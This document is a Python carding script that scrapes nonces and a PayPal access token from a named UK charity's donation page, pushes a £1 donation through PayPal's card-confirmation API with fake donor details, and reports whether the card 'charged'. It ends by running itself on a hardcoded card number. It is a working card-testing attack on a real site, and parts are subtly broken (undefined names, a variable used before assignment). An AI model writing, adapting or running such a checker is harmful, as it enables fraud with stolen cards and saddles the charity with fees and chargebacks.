import time
import requests
from requests_toolbelt.multipart.encoder import  MultipartEncoder
import re
import base64
import json
def ppc2(ccx):
	r=requests.Session()
	card=ccx.strip()
	parts = re.split(r'[:|/\\]', card)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]
	print(card)
	headers = {
	    'authority': 'thebowlbycentre.org.uk',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'cache-control': 'max-age=0',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'none',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	}
	
	response = r.get('https://thebowlbycentre.org.uk/donate/', headers=headers)
	text=response.text
	form_id=re.search(r'name="wpforms\[id\]"\s+value="(\d+)"', text).group(1)
	pid=re.search(r'name="page_id"\s+value="(\d+)"', text).group(1)
	post_id=re.search(r'name="wpforms\[post_id\]".*?value="([^"]+)"', text).group(1)
	noc=re.search(r'"nonces"\s*:\s*\{\s*"create"\s*:\s*"([^"]+)"', text).group(1)
	enc_token= re.search(r'data-client-token="([^"]+)"', text).group(1)
	dec = base64.b64decode(enc_token).decode('utf-8')
	toks = re.search(r'"accessToken":"(.*?)"', dec).group(1)
	dtk= re.search(r'<form[^>]*data-token="([^"]+)"', response.text).group(1)
	data = MultipartEncoder({
	    'wpforms[fields][1][first]': (None, 'raph'),
	    'wpforms[fields][1][last]': (None, 'raph'),
	    'wpforms[fields][2]': (None, 'raph@rhp.com'),
	    'wpforms[fields][8]': (None, 'No Reason'),
	    'wpforms[fields][3]': (None, '1.00'),
	    'wpforms[fields][4]': (None, ''),
	    'wpforms[fields][7][orderID]': (None, ''),
	    'wpforms[fields][7][subscriptionID]': (None, ''),
	    'wpforms[fields][7][source]': (None, ''),
	    'wpforms[fields][7][cardname]': (None, 'raphael'),
	    'wpforms[id]': (None, form_id),
	    'page_title': (None, 'Donate'),
	    'page_url': (None, 'https://thebowlbycentre.org.uk/donate/'),
	    'url_referer': (None, ''),
	    'page_id': (None, pid),
	    'wpforms[post_id]': (None, post_id),
	    'total': (None, '1'),
	    'is_checkout': (None, 'false'),
	    'nonce': (None, noc),
	})
	headers = {
	    'authority': 'thebowlbycentre.org.uk',
	    'accept': '*/*',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': data.content_type,
	    'origin': 'https://thebowlbycentre.org.uk',
	    'referer': 'https://thebowlbycentre.org.uk/donate/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	}
	
	params = {
	    'action': 'wpforms_paypal_commerce_create_order',
	}
	
	
	
	response = r.post(
	    'https://thebowlbycentre.org.uk/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=r.cookies,
	    headers=headers,
	    data=data,
	)
	if response.json().get("success") is True:
	    id =response.json()["data"]["id"]
	    headers = {
		    'authority': 'cors.api.paypal.com',
		    'accept': '*/*',
		    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		    'authorization': f'Bearer {toks}',
		    'braintree-sdk-version': '3.32.0-payments-sdk-dev',
		    'content-type': 'application/json',
		    'origin': 'https://assets.braintreegateway.com',
		    'referer': 'https://assets.braintreegateway.com/',
		    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'cross-site',
		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
		}
		
	    json_data = {
		    'payment_source': {
		        'card': {
		            'number': n,
		            'expiry': f'20{yy[-2:]}-{mm.zfill(2)}',
		            'security_code': cvc,
		            'name': 'raphael',
		            'attributes': {
		                'verification': {
		                    'method': 'SCA_WHEN_REQUIRED',
		                },
		            },
		        },
		    },
		    'application_context': {
		        'vault': False,
		    },
		}
		
	    response = r.post(
		    f'https://cors.api.paypal.com/v2/checkout/orders/{id}/confirm-payment-source',
		    headers=headers,
		    json=json_data,
		)
	    ord=json.loads(response.text)
	    if ord.get("status") == "APPROVED":
	    	order_id = ord["id"]
	    	start_timestamp = int(time.time())
	    	end_timestamp = start_timestamp + 120
	    	paydata = MultipartEncoder({
		    'wpforms[fields][1][first]': (None, 'raph'),
		    'wpforms[fields][1][last]': (None, 'raph'),
		    'wpforms[fields][2]': (None, 'raph@rhp.com'),
		    'wpforms[fields][8]': (None, 'No Reason'),
		    'wpforms[fields][3]': (None, '1.00'),
		    'wpforms[fields][4]': (None, ''),
		    'wpforms[fields][7][orderID]': (None, order_id),
		    'wpforms[fields][7][subscriptionID]': (None, ''),
		    'wpforms[fields][7][source]': (None, ''),
		    'wpforms[fields][7][cardname]': (None, 'raphael'),
		    'wpforms[id]': (None, form_id),
		    'page_title': (None, 'Donate'),
		    'page_url': (None, 'https://thebowlbycentre.org.uk/donate/'),
		    'url_referer': (None, ''),
		    'page_id': (None, pid),
		    'wpforms[post_id]': (None, post_id),
		    'wpforms[token]': (None, dtk),
		    'action': (None, 'wpforms_submit'),
		    'start_timestamp': (None, '1764807180'),
		    'end_timestamp': (None, '1764807375'),
		})
	    	headers = {
		    'authority': 'thebowlbycentre.org.uk',
		    'accept': 'application/json, text/javascript, */*; q=0.01',
		    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		    'content-type': paydata.content_type,
		    'origin': 'https://thebowlbycentre.org.uk',
		    'referer': 'https://thebowlbycentre.org.uk/donate/',
		    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-origin',
		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
		    'x-requested-with': 'XMLHttpRequest',
		}
	    	response = r.post('https://thebowlbycentre.org.uk/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=paydata)
	    	raw = response.text
	    	try:
	    		data = json.loads(raw)
	    	except:
	    		return raw
	    	msg = e.search(r"<p>(.*?)<\/p>", footer, flags=re.DOTALL)
	    	try:
	    		js=json.loads(response.text)
	    	except:
	    		js =response.text
	    	if js.get("success") is True and "confirmation" in js.get("data", {}) or 'Thank' in response.text or 'THANK'in response.text or 'thanks' in response.text or 'Thank' in response.text:
	    		return 'charge!'
	    	elif "This payment cannot be processed because it was declined by payment processor." in response.text:
	    		return 'Declined by payment processor'
	    	elif "This payment cannot be processed because there was an error with the capture order API call." in response.text:
	    		return 'CAPTURE_ORDER_ERROR'
	    	else:
	    		print("Not charge: {response.text}")
#not approved
	    dt=json.loads(response.text)
	    try:
	    	if dt['details'][0]['issue']:
	    		print(dt['details'][0]['issue'])
	    	else:
	    		print('Card_Issus')
	    except:
	    	print('Card_Issus')
	else:
	    if ord.get("data", {}).get("error", {}).get("details", [{}])[0].get("issue"):
	    	print(ord.get("data", {}).get("error", {}).get("details", [{}])[0].get("issue"))
	    elif ord.get("data", {}).get("errors", {}).get("details", [{}])[0].get("issue"):
	    	print(ord.get("data", {}).get("errors", {}).get("details", [{}])[0].get("issue"))
	    elif ord.get("status") == "PAYER_ACTION_REQUIRED":
	    	print('3D_SECURE_REQUIRED')
	    else:
	    	print('Card_Issus')


ppc2(ccx="4000222797728260|04|27|735")



